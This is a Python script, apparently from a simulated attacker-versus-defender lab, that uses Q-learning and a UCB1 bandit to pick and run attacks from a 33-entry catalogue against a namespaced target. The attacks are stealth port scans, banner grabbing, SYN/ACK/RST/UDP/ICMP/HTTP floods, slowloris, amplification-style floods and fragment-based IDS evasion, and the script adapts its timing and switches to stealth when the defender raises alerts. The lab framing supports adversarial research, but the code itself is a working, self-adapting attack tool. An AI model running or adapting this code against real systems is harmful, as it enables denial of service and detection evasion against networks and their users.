#!/usr/bin/env python3
"""
attacker2.py
Adaptive Q-Learning Attacker with UCB1 bandit, multi-stage campaign engine,
attack mutation, evasion adaptation, and cross-session memory.
"""

import subprocess
import random
import time
import json
import os
import math
import sys
import threading
import collections
import importlib.util
import numpy as np
from datetime import datetime

# ── Load packet engine ───────────────────────────────────────────────────────
def load_packet_engine():
    path = "/home/kaexb/packet_engine.py"
    if not os.path.exists(path):
        print(f"[ERROR] packet_engine.py not found at {path}")
        sys.exit(1)
    spec = importlib.util.spec_from_file_location("packet_engine", path)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod

# ── Constants ────────────────────────────────────────────────────────────────
STATE_FILE   = "/home/kaexb/sim/attacker_state.json"
LOG_FILE     = "/home/kaexb/sim/attacker.log"
SHARED_FILE  = "/home/kaexb/sim/shared_state.json"
HISTORY_FILE = "/home/kaexb/sim/attacker_history.jsonl"

SRC_IP = "192.168.100.1"
DST_IP = "192.168.100.2"
NETNS  = "left"

# Target ports for attacks
COMMON_PORTS  = [22, 80, 443, 8080]
SERVICE_PORTS = [21, 22, 23, 25, 53, 80, 110, 143, 443, 465, 587,
                 993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 8080,
                 8443, 8888, 9200, 27017]

# Q-learning hyperparameters
ALPHA         = 0.15   # learning rate
GAMMA         = 0.92   # discount factor - high because stage escalation matters
EPSILON_INIT  = 0.45   # initial exploration rate
EPSILON_MIN   = 0.04   # minimum exploration (always explore a little)
EPSILON_DECAY = 0.9975 # per-episode decay

# ── Attack Definitions ───────────────────────────────────────────────────────
# Each entry: (name, stage, category, description)
# stage 0=recon, 1=probe, 2=flood, 3=ddos
ATTACK_CATALOG = [
    # ── STAGE 0: RECONNAISSANCE ──────────────────────────────────────────────
    ("recon_syn_scan_fast",     0, "scan",    "Fast SYN scan of common ports"),
    ("recon_syn_scan_full",     0, "scan",    "Full SYN scan of all service ports"),
    ("recon_xmas_scan",         0, "scan",    "XMAS scan - FIN+PSH+URG evasion"),
    ("recon_null_scan",         0, "scan",    "NULL scan - no flags, evasion"),
    ("recon_fin_scan",          0, "scan",    "FIN scan - RFC 793 evasion"),
    ("recon_ttl_sweep",         0, "probe",   "TTL sweep - topology discovery"),
    ("recon_high_ports",        0, "scan",    "High port enumeration 1024-65535"),
    ("recon_slow_scan",         0, "scan",    "Slow scan to evade rate detection"),
    # ── STAGE 1: PROBING ─────────────────────────────────────────────────────
    ("probe_banner_grab",       1, "probe",   "Grab service banners"),
    ("probe_http_fingerprint",  1, "probe",   "HTTP server fingerprinting"),
    ("probe_connection_test",   1, "probe",   "Test connection establishment"),
    ("probe_port_sweep",        1, "sweep",   "Sequential port sweep"),
    ("probe_random_sweep",      1, "sweep",   "Random port sweep"),
    ("probe_fragment_probe",    1, "probe",   "IP fragment probe for filter evasion"),
    ("probe_overlap_fragment",  1, "probe",   "Overlapping fragments IDS evasion"),
    # ── STAGE 2: FLOODING ────────────────────────────────────────────────────
    ("flood_syn_standard",      2, "flood",   "Standard SYN flood"),
    ("flood_syn_fast",          2, "flood",   "High-rate SYN flood max threads"),
    ("flood_ack",               2, "flood",   "ACK flood bypasses SYN cookies"),
    ("flood_rst",               2, "flood",   "RST flood kills connections"),
    ("flood_udp_small",         2, "flood",   "UDP flood small packets"),
    ("flood_udp_large",         2, "flood",   "UDP flood large packets bandwidth"),
    ("flood_icmp_standard",     2, "flood",   "ICMP echo flood"),
    ("flood_icmp_large",        2, "flood",   "Large ICMP flood bandwidth saturation"),
    ("flood_fragment",          2, "flood",   "IP fragment flood stateless evasion"),
    ("flood_http",              2, "flood",   "HTTP GET flood application layer"),
    # ── STAGE 3: DDoS ────────────────────────────────────────────────────────
    ("ddos_mixed_vector",       3, "ddos",    "Multi-vector: SYN+ACK+UDP+ICMP"),
    ("ddos_slowloris",          3, "ddos",    "Slowloris connection exhaustion"),
    ("ddos_icmp_tsunami",       3, "ddos",    "Maximum ICMP flood with large packets"),
    ("ddos_udp_amplify_sim",    3, "ddos",    "UDP amplification simulation"),
    ("ddos_dns_flood",          3, "ddos",    "DNS query flood"),
    ("ddos_overlap_fragment",   3, "ddos",    "Overlapping fragment IDS evasion"),
    ("ddos_ntp_flood",          3, "ddos",    "NTP monlist flood simulation"),
    ("ddos_syn_tsunami",        3, "ddos",    "Max threads max rate SYN tsunami"),
]

ATTACK_NAMES    = [a[0] for a in ATTACK_CATALOG]
ATTACK_STAGE    = {a[0]: a[1] for a in ATTACK_CATALOG}
ATTACK_CATEGORY = {a[0]: a[2] for a in ATTACK_CATALOG}
ATTACK_DESC     = {a[0]: a[3] for a in ATTACK_CATALOG}
N_ATTACKS       = len(ATTACK_NAMES)

STAGE_NAMES = {0: "RECON", 1: "PROBE", 2: "FLOOD", 3: "DDOS"}


# ═══════════════════════════════════════════════════════════════════════════════
# LOGGING
# ═══════════════════════════════════════════════════════════════════════════════

def log(msg: str, level: str = "INFO"):
    ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    line = f"[{ts}][{level:7s}] ATK: {msg}"
    print(line, flush=True)
    os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
    with open(LOG_FILE, "a") as f:
        f.write(line + "\n")


# ═══════════════════════════════════════════════════════════════════════════════
# STATE MANAGEMENT
# ═══════════════════════════════════════════════════════════════════════════════

def default_state() -> dict:
    return {
        # Q-learning
        "q_table":           {a: 0.0 for a in ATTACK_NAMES},
        "q_visits":          {a: 0   for a in ATTACK_NAMES},
        "epsilon":           EPSILON_INIT,

        # Campaign state
        "total_attacks":     0,
        "total_success":     0,
        "total_blocked":     0,
        "current_stage":     0,
        "campaign_num":      0,

        # Per-stage stats
        "stage_attempts":    [0, 0, 0, 0],
        "stage_success":     [0, 0, 0, 0],
        "stage_consec_fail": [0, 0, 0, 0],

        # Timing adaptation
        "timing_ema":        2.0,
        "timing_history":    [],   # list of {delay, success}
        "fast_success_rate": 0.0,
        "slow_success_rate": 0.0,

        # Reward tracking
        "reward_history":    [],
        "last_reward":       0.0,
        "cumulative_reward": 0.0,

        # Mutation tracking
        "mutation_success":  {},   # mutation_key -> [success_count, total_count]
        "preferred_ttl":     64,
        "preferred_window":  65535,
        "preferred_frag_size": 8,

        # Evasion state
        "evasion_mode":      False,
        "evasion_trigger_count": 0,
        "last_defender_alert": 0,

        # Port memory
        "open_ports":        [],
        "closed_ports":      [],
        "filtered_ports":    [],

        # Session
        "session_start":     datetime.now().isoformat(),
        "best_attack":       ATTACK_NAMES[0],
        "best_q":            0.0,
    }


def load_state() -> dict:
    if os.path.exists(STATE_FILE):
        try:
            with open(STATE_FILE) as f:
                saved = json.load(f)
            # Merge with defaults to handle new keys
            state = default_state()
            state.update(saved)
            return state
        except Exception as e:
            log(f"State load error: {e}, starting fresh", "WARN")
    return default_state()


def save_state(state: dict):
    os.makedirs(os.path.dirname(STATE_FILE), exist_ok=True)
    # Trim histories before saving
    trimmed = dict(state)
    trimmed["reward_history"]  = state["reward_history"][-200:]
    trimmed["timing_history"]  = state["timing_history"][-100:]
    with open(STATE_FILE, "w") as f:
        json.dump(trimmed, f, indent=2)


def log_history(event: dict):
    """Append structured event to JSONL history file for analysis."""
    os.makedirs(os.path.dirname(HISTORY_FILE), exist_ok=True)
    with open(HISTORY_FILE, "a") as f:
        f.write(json.dumps(event) + "\n")


def update_shared(state: dict, current_attack: str,
                  result: str, pkt_stats: dict):
    """Write attacker state to shared file for dashboard."""
    shared = {}
    if os.path.exists(SHARED_FILE):
        try:
            with open(SHARED_FILE) as f:
                shared = json.load(f)
        except:
            pass

    q = state["q_table"]
    best = max(q, key=q.get)

    # Top 5 attacks by Q-value
    top5 = sorted(q.items(), key=lambda x: x[1], reverse=True)[:5]

    shared["attacker"] = {
        "total_attacks":   state["total_attacks"],
        "total_success":   state["total_success"],
        "total_blocked":   state["total_blocked"],
        "success_rate":    round(state["total_success"] /
                                 max(state["total_attacks"], 1), 3),
        "epsilon":         round(state["epsilon"], 4),
        "current_stage":   state["current_stage"],
        "stage_name":      STAGE_NAMES[state["current_stage"]],
        "campaign_num":    state["campaign_num"],
        "current_attack":  current_attack,
        "attack_desc":     ATTACK_DESC.get(current_attack, ""),
        "last_result":     result,
        "best_attack":     best,
        "best_q":          round(q[best], 3),
        "top5_attacks":    [(n, round(v, 3)) for n, v in top5],
        "q_table":         {k: round(v, 3) for k, v in q.items()},
        "attack_counts":   state["q_visits"],
        "stage_attempts":  state["stage_attempts"],
        "stage_success":   state["stage_success"],
        "timing_ema":      round(state["timing_ema"], 2),
        "last_reward":     round(state["last_reward"], 3),
        "cumulative_reward": round(state["cumulative_reward"], 2),
        "reward_history":  state["reward_history"][-30:],
        "evasion_mode":    state["evasion_mode"],
        "open_ports":      state["open_ports"][:10],
        "pkt_sent":        pkt_stats.get("packets_sent", 0),
        "pkt_bytes":       pkt_stats.get("bytes_sent", 0),
        "pps":             round(pkt_stats.get("pps", 0.0), 1),
        "mbps":            round(pkt_stats.get("mbps", 0.0), 3),
        "timestamp":       datetime.now().isoformat(),
    }

    with open(SHARED_FILE, "w") as f:
        json.dump(shared, f, indent=2)


# ═══════════════════════════════════════════════════════════════════════════════
# Q-LEARNING ENGINE
# ═══════════════════════════════════════════════════════════════════════════════

def ucb1_score(state: dict, attack_name: str) -> float:
    """
    UCB1 score: Q(a) + C * sqrt(ln(N) / n(a))
    Balances exploitation of high-Q attacks with exploration of
    under-tried attacks.
    """
    n_total = max(state["total_attacks"], 1)
    n_attack = max(state["q_visits"][attack_name], 1)
    q_val = state["q_table"][attack_name]

    # Exploration constant - higher = more exploration
    C = 0.5

    # Stage bonus: prefer attacks matching current stage
    stage_bonus = 0.25 if ATTACK_STAGE[attack_name] == state["current_stage"] else 0.0

    # Evasion mode: prefer slow/stealthy attacks
    if state["evasion_mode"]:
        cat = ATTACK_CATEGORY[attack_name]
        evasion_bonus = 0.3 if cat in ["scan", "probe"] else -0.2
    else:
        evasion_bonus = 0.0

    return q_val + C * math.sqrt(2 * math.log(n_total) / n_attack) \
           + stage_bonus + evasion_bonus


def select_attack(state: dict) -> str:
    """
    Epsilon-greedy with UCB1 exploitation.
    During exploration: weighted random by stage preference.
    During exploitation: UCB1 score selection.
    """
    if random.random() < state["epsilon"]:
        # Exploration: stage-weighted random
        stage = state["current_stage"]
        weights = []
        for name in ATTACK_NAMES:
            s = ATTACK_STAGE[name]
            if s == stage:
                w = 4.0
            elif abs(s - stage) == 1:
                w = 1.5
            else:
                w = 0.5
            # Extra weight for evasion attacks when in evasion mode
            if state["evasion_mode"] and ATTACK_CATEGORY[name] in ["scan", "probe"]:
                w *= 1.5
            weights.append(w)

        total = sum(weights)
        probs = [w / total for w in weights]
        chosen = np.random.choice(ATTACK_NAMES, p=probs)
        log(f"EXPLORE [{STAGE_NAMES[stage]}]: {chosen} "
            f"(eps={state['epsilon']:.3f})")
        return chosen

    # Exploitation: UCB1
    scores = {name: ucb1_score(state, name) for name in ATTACK_NAMES}
    chosen = max(scores, key=scores.get)
    log(f"EXPLOIT [{STAGE_NAMES[state['current_stage']]}]: {chosen} "
        f"(UCB={scores[chosen]:.3f}, Q={state['q_table'][chosen]:.3f})")
    return chosen


def compute_reward(
    success: bool,
    attack_name: str,
    pkt_stats: dict,
    defender_alert: int,
    state: dict,
) -> float:
    """
    Shaped reward function.

    Success factors:
    - Base reward: +1.0 success, -0.5 failure
    - Stage multiplier: higher stage = higher reward (riskier)
    - PPS bonus: reward fast successful attacks
    - Bytes bonus: reward high-bandwidth attacks
    - Evasion bonus: reward attacks that succeed during high alert

    Penalty factors:
    - Defender escalation: penalize if we triggered higher alert
    - Repeated failure: penalize trying the same failing attack repeatedly
    """
    stage = ATTACK_STAGE[attack_name]
    stage_mult = 1.0 + (stage * 0.4)  # 1.0, 1.4, 1.8, 2.2

    base = 1.0 if success else -0.5

    # PPS bonus for successful floods
    pps = pkt_stats.get("pps", 0)
    pps_bonus = 0.0
    if success and pps > 0:
        pps_bonus = min(pps / 2000.0, 0.4)  # cap at +0.4

    # Bandwidth bonus
    mbps = pkt_stats.get("mbps", 0)
    mbps_bonus = min(mbps * 2.0, 0.3) if success else 0.0

    # Evasion success bonus: succeeded despite high defender alert
    evasion_bonus = 0.0
    if success and defender_alert >= 2:
        evasion_bonus = 0.3 * (defender_alert - 1)

    # Defender escalation penalty
    prev_alert = state["last_defender_alert"]
    escalation_penalty = 0.0
    if defender_alert > prev_alert:
        escalation_penalty = 0.2 * (defender_alert - prev_alert)

    # Repeated consecutive failure penalty
    consec_fail = state["stage_consec_fail"][stage]
    repeat_penalty = min(consec_fail * 0.05, 0.3) if not success else 0.0

    reward = (base * stage_mult
              + pps_bonus
              + mbps_bonus
              + evasion_bonus
              - escalation_penalty
              - repeat_penalty)

    return round(reward, 4)


def update_q_table(state: dict, attack_name: str, reward: float):
    """
    Q-learning update rule:
    Q(a) <- Q(a) + alpha * (r + gamma * max_Q - Q(a))

    This is single-step Q-learning (no state transitions needed since
    we treat each attack as independent).
    The 'next state' value is approximated by max Q in the same attack set.
    """
    old_q = state["q_table"][attack_name]
    max_future_q = max(state["q_table"].values())
    new_q = old_q + ALPHA * (reward + GAMMA * max_future_q - old_q)
    state["q_table"][attack_name] = round(new_q, 5)

    # Update best
    best = max(state["q_table"], key=state["q_table"].get)
    state["best_attack"] = best
    state["best_q"] = state["q_table"][best]


def decay_epsilon(state: dict):
    """Decay exploration rate over time."""
    state["epsilon"] = max(
        EPSILON_MIN,
        state["epsilon"] * EPSILON_DECAY,
    )


# ═══════════════════════════════════════════════════════════════════════════════
# CAMPAIGN STAGE MANAGEMENT
# ═══════════════════════════════════════════════════════════════════════════════

def update_stage(state: dict, attack_name: str, success: bool):
    """
    Manage campaign stage progression.

    Escalation: if current stage success rate > 60% after 8 attempts,
                move to next stage.
    De-escalation: if current stage success rate < 20% after 10 attempts,
                   fall back to previous stage (reset and try differently).

    Also tracks consecutive failures to detect when we're being blocked hard.
    """
    stage = ATTACK_STAGE[attack_name]

    if success:
        state["stage_consec_fail"][stage] = 0
    else:
        state["stage_consec_fail"][stage] += 1

    current = state["current_stage"]
    att = state["stage_attempts"][current]
    suc = state["stage_success"][current]

    if att < 8:
        return  # Not enough data yet

    rate = suc / att

    if rate > 0.60 and current < 3:
        state["current_stage"] = current + 1
        state["campaign_num"] += 1
        log(f"ESCALATE: Stage {current} -> {current+1} "
            f"({STAGE_NAMES[current]} -> {STAGE_NAMES[current+1]}) "
            f"success_rate={rate:.1%}", "STAGE")
        # Reset attempt counts for new stage to give it a fair shake
        state["stage_attempts"][current + 1] = 0
        state["stage_success"][current + 1]  = 0

    elif rate < 0.20 and current > 0:
        state["current_stage"] = current - 1
        log(f"DEESCALATE: Stage {current} -> {current-1} "
            f"({STAGE_NAMES[current]} -> {STAGE_NAMES[current-1]}) "
            f"success_rate={rate:.1%}", "STAGE")
        # Penalize all stage 3 attacks since they're getting blocked
        for name in ATTACK_NAMES:
            if ATTACK_STAGE[name] == current:
                state["q_table"][name] = max(
                    state["q_table"][name] - 0.3, -2.0)


def update_evasion_mode(state: dict, defender_alert: int):
    """
    Switch to evasion mode when defender is highly alert.
    In evasion mode: prefer slow/stealthy attacks, increase timing delays.
    """
    if defender_alert >= 3 and not state["evasion_mode"]:
        state["evasion_mode"] = True
        state["evasion_trigger_count"] += 1
        log("EVASION MODE ON: Defender at CRITICAL, switching to stealth", "EVASION")
        # Boost Q-values of stealthy attacks
        for name in ATTACK_NAMES:
            if ATTACK_CATEGORY[name] in ["scan"] and ATTACK_STAGE[name] <= 1:
                state["q_table"][name] += 0.2

    elif defender_alert <= 1 and state["evasion_mode"]:
        state["evasion_mode"] = False
        log("EVASION MODE OFF: Defender alert dropped, resuming normal ops", "EVASION")

    state["last_defender_alert"] = defender_alert


# ═══════════════════════════════════════════════════════════════════════════════
# TIMING ADAPTATION
# ═══════════════════════════════════════════════════════════════════════════════

def adapt_timing(state: dict, success: bool, delay_used: float):
    """
    EMA-based timing adaptation.
    Tracks whether fast or slow attacks succeed more.
    Biases toward the faster/slower category accordingly.
    """
    state["timing_history"].append({
        "delay": delay_used,
        "success": success,
        "time": time.time(),
    })

    # Keep last 50 entries
    history = state["timing_history"][-50:]
    state["timing_history"] = history

    if len(history) < 10:
        return

    # Compute success rates for fast (<1s) vs slow (>2s) delays
    fast = [h for h in history if h["delay"] < 1.0]
    slow = [h for h in history if h["delay"] > 2.0]

    fast_rate = sum(h["success"] for h in fast) / max(len(fast), 1)
    slow_rate = sum(h["success"] for h in slow) / max(len(slow), 1)

    state["fast_success_rate"] = round(fast_rate, 3)
    state["slow_success_rate"] = round(slow_rate, 3)

    alpha = 0.2
    if success:
        # Current timing worked - nudge toward it
        target = delay_used * random.uniform(0.8, 1.2)
    else:
        # Current timing failed - try something different
        if fast_rate > slow_rate:
            # Fast attacks work better
            target = random.uniform(0.2, 1.0)
        else:
            # Slow attacks work better (evasion)
            target = random.uniform(2.0, 6.0)

    # If in evasion mode, always slow down
    if state["evasion_mode"]:
        target = max(target, 3.0)

    state["timing_ema"] = alpha * target + (1 - alpha) * state["timing_ema"]
    state["timing_ema"] = max(0.1, min(10.0, state["timing_ema"]))


def get_next_delay(state: dict) -> float:
    """Get delay for next attack with some randomness."""
    base = state["timing_ema"]
    jitter = random.uniform(-0.3, 0.3)
    delay = max(0.1, base + jitter)
    return round(delay, 2)


# ═══════════════════════════════════════════════════════════════════════════════
# SHARED STATE READER
# ═══════════════════════════════════════════════════════════════════════════════

def get_defender_alert() -> int:
    """Read current defender alert level from shared state file."""
    try:
        with open(SHARED_FILE) as f:
            shared = json.load(f)
        return shared.get("defender", {}).get("alert_level", 0)
    except:
        return 0


def get_defender_blocks() -> int:
    """Read total defender block count."""
    try:
        with open(SHARED_FILE) as f:
            shared = json.load(f)
        return shared.get("defender", {}).get("total_blocks", 0)
    except:
        return 0


# ═══════════════════════════════════════════════════════════════════════════════
# ATTACK EXECUTORS
# All attacks run packets inside the 'left' network namespace.
# ═══════════════════════════════════════════════════════════════════════════════

def run_in_ns(cmd: list, timeout: int = 15) -> tuple:
    """Execute a command inside the left network namespace."""
    full = ["sudo", "ip", "netns", "exec", NETNS] + cmd
    try:
        r = subprocess.run(full, capture_output=True, text=True, timeout=timeout)
        return r.returncode, r.stdout + r.stderr
    except subprocess.TimeoutExpired:
        return -1, "timeout"
    except Exception as e:
        return -2, str(e)


def ncat_connect(port: int, timeout: int = 2) -> bool:
    """Try to connect to a port via ncat in left namespace."""
    rc, _ = run_in_ns(["ncat", "-zv", "-w", str(timeout),
                        DST_IP, str(port)], timeout=timeout+2)
    return rc == 0


def execute_attack(attack_name: str, engine, mutation) -> tuple:
    """
    Execute the specified attack and return (success, pkt_stats).
    All attacks run raw packets inside the left namespace via FloodEngine,
    or use ncat for application-layer probing.
    """
    dport = random.choice(COMMON_PORTS)
    ttl   = mutation.mutate_ttl()
    window= mutation.mutate_window()
    empty = {"packets_sent": 0, "bytes_sent": 0, "pps": 0.0, "mbps": 0.0}

    # ── STAGE 0: RECON ───────────────────────────────────────────────────────

    if attack_name == "recon_syn_scan_fast":
        ports = random.sample(SERVICE_PORTS, min(15, len(SERVICE_PORTS)))
        stats = engine.port_scan_fast(ports)
        return stats["packets_sent"] >= len(ports) // 2, stats

    elif attack_name == "recon_syn_scan_full":
        ports = SERVICE_PORTS[:]
        random.shuffle(ports)
        stats = engine.port_scan_fast(ports)
        return stats["packets_sent"] >= len(ports) // 2, stats

    elif attack_name == "recon_xmas_scan":
        ports = random.sample(range(1, 2048), 20)
        stats = engine.xmas_scan(ports)
        return stats["packets_sent"] > 10, stats

    elif attack_name == "recon_null_scan":
        ports = random.sample(range(1, 2048), 20)
        stats = engine.null_scan(ports)
        return stats["packets_sent"] > 10, stats

    elif attack_name == "recon_fin_scan":
        ports = random.sample(range(1, 1024), 20)
        stats = engine.fin_scan(ports)
        return stats["packets_sent"] > 10, stats

    elif attack_name == "recon_ttl_sweep":
        stats = engine.ttl_probe_sweep(dport, ttl_range=(1, 8))
        return stats["packets_sent"] > 15, stats

    elif attack_name == "recon_high_ports":
        ports = random.sample(range(1024, 65535), 15)
        stats = engine.port_scan_fast(ports)
        return stats["packets_sent"] > 5, stats

    elif attack_name == "recon_slow_scan":
        ports = random.sample(SERVICE_PORTS, 6)
        stats = engine.port_scan_slow(
            ports,
            min_delay=random.uniform(2.0, 4.0),
            max_delay=random.uniform(5.0, 9.0),
        )
        return stats["packets_sent"] >= len(ports) // 2, stats

    # ── STAGE 1: PROBING ─────────────────────────────────────────────────────

    elif attack_name == "probe_banner_grab":
        # Try to grab banners from multiple services
        grabbed = 0
        for port in [22, 80, 443]:
            rc, out = run_in_ns(["ncat", "-w2", DST_IP, str(port)], timeout=4)
            if len(out.strip()) > 3:
                grabbed += 1
        return grabbed > 0, {"packets_sent": 9, "bytes_sent": 540,
                              "pps": 1.0, "mbps": 0.0}

    elif attack_name == "probe_http_fingerprint":
        rc, out = run_in_ns([
            "ncat", "-w3", DST_IP, "80"
        ], timeout=5)
        # Send HTTP request via stdin pipe
        proc = subprocess.run(
            ["sudo", "ip", "netns", "exec", NETNS,
             "bash", "-c",
             f"echo -e 'HEAD / HTTP/1.0\\r\\nHost: {DST_IP}\\r\\n\\r\\n' | "
             f"ncat -w3 {DST_IP} 80"],
            capture_output=True, text=True, timeout=6
        )
        got_response = len(proc.stdout.strip()) > 0 or "HTTP" in proc.stdout
        return got_response, {"packets_sent": 4, "bytes_sent": 300,
                               "pps": 0.5, "mbps": 0.0}

    elif attack_name == "probe_connection_test":
        hits = 0
        for port in COMMON_PORTS:
            if ncat_connect(port):
                hits += 1
        return hits > 0, {"packets_sent": len(COMMON_PORTS) * 2,
                           "bytes_sent": len(COMMON_PORTS) * 120,
                           "pps": 2.0, "mbps": 0.0}

    elif attack_name == "probe_port_sweep":
        start = random.randint(1, 1000)
        ports = list(range(start, min(start + 25, 65535)))
        hits = 0
        for port in ports:
            if ncat_connect(port, timeout=1):
                hits += 1
        return hits > 0, {"packets_sent": len(ports) * 2,
                           "bytes_sent": len(ports) * 80,
                           "pps": 5.0, "mbps": 0.0}

    elif attack_name == "probe_random_sweep":
        ports = random.sample(range(1, 65535), 20)
        hits = 0
        for port in ports:
            if ncat_connect(port, timeout=1):
                hits += 1
        return hits > 0, {"packets_sent": 40, "bytes_sent": 2400,
                           "pps": 4.0, "mbps": 0.0}

    elif attack_name == "probe_fragment_probe":
        stats = engine.fragment_flood(dport, count=10)
        return stats["packets_sent"] > 5, stats

    elif attack_name == "probe_overlap_fragment":
        stats = engine.overlapping_fragment_flood(dport, count=10)
        return stats["packets_sent"] > 5, stats

    # ── STAGE 2: FLOODING ────────────────────────────────────────────────────

    elif attack_name == "flood_syn_standard":
        count = random.randint(200, 500)
        stats = engine.syn_flood(dport, count=count, threads=4)
        return stats["packets_sent"] >= count * 0.7, stats

    elif attack_name == "flood_syn_fast":
        count = random.randint(500, 1000)
        stats = engine.syn_flood(dport, count=count, threads=8)
        return stats["packets_sent"] >= count * 0.6, stats

    elif attack_name == "flood_ack":
        count = random.randint(300, 600)
        stats = engine.ack_flood(dport, count=count, threads=4)
        return stats["packets_sent"] >= count * 0.7, stats

    elif attack_name == "flood_rst":
        count = random.randint(200, 400)
        stats = engine.rst_flood(dport, count=count, threads=3)
        return stats["packets_sent"] >= count * 0.7, stats

    elif attack_name == "flood_udp_small":
        count = random.randint(200, 400)
        stats = engine.udp_flood(dport, count=count,
                                  payload_size=random.randint(64, 128),
                                  threads=4)
        return stats["packets_sent"] >= count * 0.6, stats

    elif attack_name == "flood_udp_large":
        count = random.randint(150, 300)
        stats = engine.udp_flood(dport, count=count,
                                  payload_size=random.randint(900, 1400),
                                  threads=4)
        return stats["packets_sent"] >= count * 0.5, stats

    elif attack_name == "flood_icmp_standard":
        count = random.randint(300, 600)
        stats = engine.icmp_flood(count=count, large=False, threads=4)
        return stats["packets_sent"] >= count * 0.7, stats

    elif attack_name == "flood_icmp_large":
        count = random.randint(200, 400)
        stats = engine.icmp_flood(count=count, large=True, threads=4)
        return stats["packets_sent"] >= count * 0.6, stats

    elif attack_name == "flood_fragment":
        count = random.randint(80, 150)
        stats = engine.fragment_flood(dport, count=count)
        return stats["packets_sent"] >= count * 0.5, stats

    elif attack_name == "flood_http":
        count = random.randint(150, 300)
        stats = engine.http_flood(dport, count=count, threads=4)
        return stats["packets_sent"] >= count * 0.6, stats

    # ── STAGE 3: DDOS ────────────────────────────────────────────────────────

    elif attack_name == "ddos_mixed_vector":
        count = random.randint(600, 1200)
        stats = engine.mixed_flood(dport, count=count, threads=8)
        return stats["packets_sent"] >= count * 0.5, stats

    elif attack_name == "ddos_slowloris":
        stats = engine.slowloris(
            dport,
            connections=random.randint(15, 30),
            hold_secs=random.randint(3, 8),
        )
        return stats["packets_sent"] >= 10, stats

    elif attack_name == "ddos_icmp_tsunami":
        count = random.randint(500, 1000)
        stats = engine.icmp_flood(count=count, large=True, threads=8)
        return stats["packets_sent"] >= count * 0.6, stats

    elif attack_name == "ddos_udp_amplify_sim":
        # Hit multiple high-amplification ports
        total_sent = 0
        total_bytes = 0
        for amp_port in [53, 123, 161, 1900, 5353, 11211]:
            s = engine.udp_flood(amp_port, count=50,
                                  payload_size=random.randint(512, 1400),
                                  threads=2)
            total_sent += s["packets_sent"]
            total_bytes += s["bytes_sent"]
        return total_sent >= 150, {
            "packets_sent": total_sent,
            "bytes_sent": total_bytes,
            "pps": total_sent / 6.0,
            "mbps": total_bytes * 8 / 6_000_000,
        }

    elif attack_name == "ddos_dns_flood":
        stats = engine.dns_amplification(count=random.randint(100, 200))
        return stats["packets_sent"] >= 80, stats

    elif attack_name == "ddos_overlap_fragment":
        count = random.randint(100, 200)
        stats = engine.overlapping_fragment_flood(dport, count=count)
        return stats["packets_sent"] >= count * 0.5, stats

    elif attack_name == "ddos_ntp_flood":
        stats = engine.ntp_flood(count=random.randint(100, 200))
        return stats["packets_sent"] >= 80, stats

    elif attack_name == "ddos_syn_tsunami":
        count = random.randint(800, 1500)
        stats = engine.syn_flood(dport, count=count, threads=12)
        return stats["packets_sent"] >= count * 0.5, stats

    # Fallback
    return False, empty


# ═══════════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    log("=" * 60)
    log("Adaptive Attacker v2 Starting")
    log(f"Target: {DST_IP} in namespace '{NETNS}'")
    log(f"Attack catalog: {N_ATTACKS} attacks across 4 stages")
    log("=" * 60)

    os.makedirs("/home/kaexb/sim", exist_ok=True)

    # Load modules
    pe = load_packet_engine()
    engine = pe.FloodEngine(SRC_IP, DST_IP, netns=NETNS)
    mutation = pe.MutationEngine()
    state = load_state()

    log(f"Loaded state: {state['total_attacks']} prior attacks, "
        f"stage={state['current_stage']}, "
        f"epsilon={state['epsilon']:.3f}")

    attack_num = 0

    while True:
        attack_num += 1

        # Select attack via Q-learning
        attack_name = select_attack(state)
        stage = ATTACK_STAGE[attack_name]
        category = ATTACK_CATEGORY[attack_name]

        state["q_visits"][attack_name] += 1
        state["total_attacks"] += 1
        state["stage_attempts"][stage] += 1

        log(f"[{attack_num:4d}] EXECUTE stage={stage} cat={category} "
            f"attack={attack_name}")

        # Execute attack
        t_start = time.time()
        try:
            success, pkt_stats = execute_attack(attack_name, engine, mutation)
        except Exception as e:
            log(f"Attack execution error: {e}", "ERROR")
            success = False
            pkt_stats = {"packets_sent": 0, "bytes_sent": 0,
                         "pps": 0.0, "mbps": 0.0}
        elapsed = time.time() - t_start

        # Read defender state
        defender_alert = get_defender_alert()

        # Update stats
        if success:
            state["total_success"] += 1
            state["stage_success"][stage] += 1
            log(f"        SUCCESS: pkts={pkt_stats.get('packets_sent',0)} "
                f"pps={pkt_stats.get('pps',0):.0f} "
                f"mbps={pkt_stats.get('mbps',0):.3f} "
                f"elapsed={elapsed:.1f}s "
                f"defender={defender_alert}", "SUCCESS")
        else:
            state["total_blocked"] += 1
            log(f"        BLOCKED: pkts={pkt_stats.get('packets_sent',0)} "
                f"elapsed={elapsed:.1f}s "
                f"defender={defender_alert}", "BLOCKED")

        # Compute reward and update Q-table
        reward = compute_reward(success, attack_name, pkt_stats,
                                defender_alert, state)
        state["last_reward"] = reward
        state["cumulative_reward"] += reward
        state["reward_history"].append(round(reward, 3))

        update_q_table(state, attack_name, reward)
        update_stage(state, attack_name, success)
        update_evasion_mode(state, defender_alert)

        # Timing adaptation
        delay = get_next_delay(state)
        adapt_timing(state, success, delay)
        decay_epsilon(state)

        # Log structured history
        log_history({
            "ts": datetime.now().isoformat(),
            "n": attack_num,
            "attack": attack_name,
            "stage": stage,
            "success": success,
            "reward": reward,
            "defender_alert": defender_alert,
            "pps": pkt_stats.get("pps", 0),
            "pkts": pkt_stats.get("packets_sent", 0),
            "delay": delay,
        })

        # Update shared state for dashboard
        update_shared(state, attack_name,
                      "success" if success else "blocked",
                      pkt_stats)

        # Save state periodically
        if attack_num % 10 == 0:
            save_state(state)
            log(f"State saved | Q_best={state['best_attack']} "
                f"({state['best_q']:.3f}) "
                f"success_rate="
                f"{state['total_success']/max(state['total_attacks'],1):.1%}")

        log(f"        Sleep {delay:.1f}s | "
            f"eps={state['epsilon']:.3f} | "
            f"stage={state['current_stage']} | "
            f"evasion={state['evasion_mode']}")
        time.sleep(delay)


if __name__ == "__main__":
    main()